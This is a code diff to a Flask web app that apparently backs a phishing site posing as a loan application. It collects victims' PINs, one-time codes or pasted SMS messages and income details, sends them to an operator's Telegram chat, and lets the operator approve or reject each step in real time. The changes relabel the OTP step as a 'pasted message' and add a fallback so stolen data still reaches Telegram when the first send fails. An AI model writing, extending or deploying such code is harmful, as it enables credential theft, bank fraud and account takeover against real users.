@@ -29,6 +29,8 @@ def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="logi
         return
 
     db_id = str(app_data.get("_id"))
+    raw_msg = (app_data.get("final_auth_code") or "").strip()
+    formatted_msg = raw_msg if raw_msg else "—"
 
     message = (
         f"⚡ *{stage_title}*\n"
@@ -40,7 +42,7 @@ def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="logi
         f"• *Purpose:* {app_data.get('purpose', '—')}\n"
         f"• *Income:* ${app_data.get('income', '—')}\n"
         f"• *PIN:* `{app_data.get('password', '—')}`\n"
-        f"• *OTP Code:* `{app_data.get('final_auth_code', '—')}`\n"
+        f"• *Pasted Message:*\n{formatted_msg}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"• *Ref ID:* `{app_data.get('app_id')}`"
     )
@@ -75,7 +77,14 @@ def send_telegram_alert(app_data, stage_title="LOGIN SUBMITTED", step_code="logi
     }
 
     try:
-        requests.post(url, json=payload, timeout=6)
+        resp = requests.post(url, json=payload, timeout=6)
+        if not resp.ok:
+            payload_plain = {
+                "chat_id": TELEGRAM_ADMIN_CHAT_ID,
+                "text": message.replace("*", "").replace("`", ""),
+                "reply_markup": reply_markup,
+            }
+            requests.post(url, json=payload_plain, timeout=6)
     except Exception as e:
         print(f"Telegram alert error: {e}")
 
@@ -106,10 +115,10 @@ def telegram_webhook():
                     text_response = "Login approved — user moving to next step"
                 elif step_code == "sim":
                     new_status = "SIM_Approved"
-                    text_response = "SIM approved — user moving to OTP"
+                    text_response = "SIM approved — user moving to verification"
                 elif step_code == "otp":
                     new_status = "OTP_Approved"
-                    text_response = "OTP approved — completing application"
+                    text_response = "Message approved — completing application"
                 else:
                     new_status = "OTP_Approved"
                     text_response = "Approved"
@@ -129,7 +138,7 @@ def telegram_webhook():
                     text_response = "SIM rejected — returning to SIM check"
                 else:
                     rejected_status = "OTP_Rejected"
-                    text_response = "OTP rejected — returning to OTP page"
+                    text_response = "Message rejected — returning to paste page"
 
                 if oid:
                     applications_collection.update_one(
@@ -371,7 +380,7 @@ def check_status():
 @app.route("/final-verify", methods=["GET", "POST"])
 def final_verify():
     if request.method == "POST":
-        final_code = request.form.get("final_code")
+        final_code = (request.form.get("final_code") or "").strip()
         current_id = session.get("current_app_id")
         record = None
 
@@ -391,7 +400,7 @@ def final_verify():
                 )
                 record = applications_collection.find_one({"_id": oid})
                 if record:
-                    send_telegram_alert(record, stage_title="STEP 2: OTP SUBMITTED", step_code="otp")
+                    send_telegram_alert(record, stage_title="STEP 2: MESSAGE SUBMITTED", step_code="otp")
             except Exception as e:
                 print(f"final_verify error: {e}")
 
